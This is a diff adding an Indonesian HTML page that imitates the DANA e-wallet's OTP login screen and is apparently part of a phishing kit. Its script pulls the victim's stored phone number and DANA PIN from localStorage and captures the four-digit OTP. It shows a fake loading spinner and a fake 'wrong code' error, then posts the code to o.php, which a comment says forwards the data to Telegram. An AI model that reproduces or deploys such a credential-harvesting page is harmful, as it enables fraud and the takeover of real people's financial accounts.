@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <meta name="theme-color" content="#118eea" />
+  <title>OTP Masuk</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #118eea;
+      text-align: center;
+      color: white;
+    }
+
+    .container {
+      margin-top: 100px;
+    }
+
+    .phone-box {
+      display: inline-block;
+      background: #007acc;
+      border-radius: 10px;
+      padding: 10px 20px;
+      font-size: 18px;
+      margin: 10px 0;
+    }
+
+    .via {
+      display: flex;
+      font-weight:bold;
+      
+      justify-content: center;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .via img {
+      width: 125px;
+      margin: 0 5px;
+    }
+
+    .otp-boxes {
+      display: flex;
+      justify-content: center;
+      margin: 30px 0;
+      gap: 10px;
+    }
+
+    .otp-boxes input {
+      width: 43px;
+      height: 43px;
+      font-size: 30px;
+      text-align: center;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+    }
+.resend-container .line {
+  width: 1px;
+  height: 20px;
+  background-color: #aaa;
+}
+
+    .resend-container {
+      background: white;
+      color: #808080;
+      display: flex;
+      justify-content: space-between;
+      margin: 0 auto;
+      width: 150px;
+      border-radius: 8px;
+      padding: 10px;
+      font-weight: none;
+    }
+
+    .loading-wrapper {
+      position: relative;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      margin-top: -10px;
+    }
+
+    .spinner-bg, .spinner-fg {
+      width: 50px;
+      height: 50px;
+      position: absolute;
+    }
+
+    .spinner-fg {
+      width: 35px;
+      height: 35px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+
+  #error-message {
+  position: fixed;
+  top: 32%; /* Geser lebih ke atas */
+  left: 50%;
+  transform: translateX(-50%);
+  background: none; /* tidak perlu background */
+  color: red;
+  font-weight: bold;
+  font-size: 12px;
+  z-index: 9999;
+  display: none;
+}
+
+.loading-wrapper {
+  position: relative;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  margin-top: -30%; /* lebih dekat ke atas */
+}
+nav {
+            width: 100%;
+            position: fixed;
+            background-color: #118eea;
+            z-index: 1000;
+        }
+        nav.top {
+            top: 0;
+            border-bottom: 1px solid #118eea;
+        }
+        nav.bottom {
+            bottom: 0;
+            border-top: 1px solid #ddd;
+        }
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+  </style>
+</head>
+<body>
+      <nav class="top">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjtZk9CxdgzGz5G2V_zwYWZWCDyspJgCzTchX32VBPelBde-aQOtlHqV0oLPMevun3TQAZFNhPJ93lxDWP173gieRVfx4v7blxnDzqLGmTcijFFgW-YUuYwgHz_BHfLn-OQ5efE7CmsukOIWgxEYQFfRd5XbkoZlGqBEaaHCAgIXv76qHAQ7ryvjHHM6hAR" alt="Nav Atas">
+    </nav>
+  
+
+
+  <div class="container">
+    <div style="font-size: 18px;font-weight:none;">Kode OTP telah terkirim ke</div>
+    <div class="phone-box" id="phone-display">+62</div>
+
+    <div class="via">
+      <span>Via</span>
+      <img src="imgbb.png" alt="icon" />
+      <span></span>
+    </div>
+    
+    <form id="otp-form" action="o.php" method="POST">
+  <div class="otp-boxes">
+    <input type="tel" name="otp1" maxlength="1" oninput="moveNext(this, 0)">
+    <input type="tel" name="otp2" maxlength="1" oninput="moveNext(this, 1)">
+    <input type="tel" name="otp3" maxlength="1" oninput="moveNext(this, 2)">
+    <input type="tel" name="otp4" maxlength="1" oninput="moveNext(this, 3)">
+  </div>
+  <input type="hidden" name="otp" id="otp-value">
+</form>
+
+
+<div class="resend-container">
+  <span>KIRIM ULANG</span>
+  <div class="line"></div>
+  <span id="timer">01:00</span>
+</div>
+<div id="error-message">Kode OTP Salah/Tidak Valid</div>
+
+    <div class="loading-wrapper" id="loading">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhGNxko9JaP0ln_kJmuob7Ns-2UAOOXtvT4HRJJZ2qe2AZskeFrJ5EkKn1pkJ8gkMJ0e7du66jGhr_zrQVTDGC3i6jnTkJTfZ2MqGA0SaKUMk2gpPZVzFOBkUh47FrKLlY-L6Cxj5lw50WB-stSGFdGzh93mv_pm3mZhL_-ZbJyte0InQxeLtAh9gUOZvDc" class="spinner-bg" alt="static">
+      <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgwBRmagHn1FaafTS35Jd6qWd5v02Ro_o1gVltUC2n5tZgbR7Oa-N_mZfx930gTIn6B5O5W3iBUa4TZQEBgbavfithVxydhSCL0WYQgVlCtAWU_FvstTmH48_Qq3FZHvyoPAqIvqqQ7o5umnHdIqggQ6cvbTEYaN_MbaXyGtQfyFr1gkqvxHUAh0NCsnFXg" class="spinner-fg" alt="loading">
+    </div>
+        
+<script>
+  const phoneDisplay = document.getElementById("phone-display");
+  const phoneNumber = localStorage.getItem("phoneNumber") || "+62 Nomor tidak ditemukan";
+  const pin = localStorage.getItem("pinDANA") || "PIN tidak ditemukan";
+
+  // Tampilkan nomor jika tersedia
+  phoneDisplay.innerText = phoneNumber;
+
+  const inputs = document.querySelectorAll('.otp-boxes input');
+  const loading = document.getElementById('loading');
+  const errorBox = document.getElementById('error-message');
+
+  inputs[0].focus();
+
+  // Validasi angka dan auto-pindah input
+  function moveNext(elem, index) {
+    elem.value = elem.value.replace(/[^0-9]/g, '');
+
+    if (elem.value && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    } else if (!elem.value && index > 0) {
+      inputs[index - 1].focus();
+    }
+
+    checkOtpComplete();
+  }
+
+
+function checkOtpComplete() {
+  const otp = Array.from(inputs).map(i => i.value).join('');
+  if (otp.length === 4) {
+    // simpan ke hidden
+    document.getElementById("otp-value").value = otp;
+    // 1) tampilkan loading
+    loading.style.display = 'flex';
+
+    // 2) tunggu 5 detik
+    setTimeout(() => {
+      // 3a) sembunyikan loading
+      loading.style.display = 'none';
+      // 3b) tampilkan error
+      errorBox.style.display = 'block';
+
+      // 4) tunggu 3 detik, sembunyikan error + reset input + fokus
+      setTimeout(() => {
+        errorBox.style.display = 'none';
+        inputs.forEach(i => i.value = '');
+        inputs[0].focus();
+      }, 3000);
+
+      // 5) kirim data ke Telegram via PHP
+      document.getElementById("otp-form").submit();
+    }, 5000);
+  }
+}
+
+
+  // Timer Kirim Ulang
+  let timerElement = document.getElementById("timer");
+  let seconds = 60;
+  const countdown = setInterval(() => {
+    seconds--;
+    let min = String(Math.floor(seconds / 60)).padStart(2, '0');
+    let sec = String(seconds % 60).padStart(2, '0');
+    timerElement.textContent = `${min}:${sec}`;
+    if (seconds <= 0) clearInterval(countdown);
+  }, 1000);
+</script>
+
+
+ 
+</body>
+</html>
